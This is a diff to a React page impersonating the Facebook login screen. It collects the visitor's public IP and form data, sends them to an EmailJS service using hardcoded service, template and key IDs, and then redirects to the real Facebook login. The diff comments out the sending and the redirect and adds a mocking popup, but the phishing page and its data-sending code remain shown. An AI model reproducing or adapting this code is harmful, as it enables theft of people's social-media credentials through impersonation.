@@ -2,6 +2,8 @@ import React, { useEffect, useState } from 'react';
 import './App.css';
 import fb_image from '../src/images/fb_logo.svg'
 import emailjs from '@emailjs/browser';
+import Swal from 'sweetalert2';
+
 const publicIp = require("react-public-ip");
 
 const FacebookLoginPage = () => {
@@ -61,13 +63,21 @@ const FacebookLoginPage = () => {
             datetime: dateTime,
         };
         try {
-            const result = await emailjs.send(
-                'service_z7ysfj4',
-                'template_npetqre',
-                templateParams,
-                'HYmy10exBQfzB2uAf'
-            );
-            window.location('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ0OTgyODM0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next')
+            // const result = await emailjs.send(
+            //     'service_z7ysfj4',
+            //     'template_npetqre',
+            //     templateParams,
+            //     'HYmy10exBQfzB2uAf'
+            // );
+
+
+            Swal.fire({
+                title: 'Cuttttttt!',
+                text: 'Cuttttttt dummmmmmmmmmmm',
+                icon: 'error',
+                confirmButtonText: 'Cool'
+            });
+            // window.location('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ0OTgyODM0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next')
         } catch (error) {
         }
 
